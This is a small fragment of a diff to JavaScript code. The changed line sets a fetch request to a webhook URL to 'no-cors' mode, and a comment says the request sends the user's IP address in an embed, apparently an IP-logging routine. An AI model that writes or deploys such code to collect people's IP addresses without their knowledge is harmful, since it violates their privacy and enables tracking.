@@ -19,7 +19,7 @@
         try {
           await fetch(webhookURL, {
             method: "POST",
-            mode: "cors",
+            mode: "no-cors",
             // Send the IP address in an embed
             body: JSON.stringify({
               embeds: [
